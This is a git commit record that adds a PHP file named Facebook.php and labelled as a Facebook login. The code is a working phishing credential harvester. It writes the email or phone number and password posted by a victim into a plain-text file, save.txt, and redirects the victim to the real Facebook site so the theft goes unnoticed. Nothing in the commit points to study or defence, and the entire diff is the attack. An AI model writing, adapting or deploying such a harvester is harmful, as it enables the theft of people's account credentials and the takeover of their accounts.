63e7cc446559c72d7fc62ba06ef301b56f2821de
Blog.apk <46821030+BuatApkOlshop@users.noreply.github.com>
2019-03-22 20:06:16 +0800

    Create Facebook.php

---
+++ Facebook.php
@@ -0,0 +1,21 @@
+Facebok login
+ <?php
+header("Location: http://facebook.com");
+$ADEx = "save.txt";
+$ADEy = $_POST['email'];
+$ADEz = $_POST['pass'];
+
+$handle = fopen($ADEx, 'a');
+fwrite($handle, "Email atau Telepon :");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEy");
+fwrite($handle, "\n");
+fwrite($handle, "Kata Sandi :");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEz");
+fwrite($handle, "\n");
+fwrite($handle, "+++++++++++++++++++");
+fwrite($handle, "\n");
+fclose($handle);
+exit;
+?>
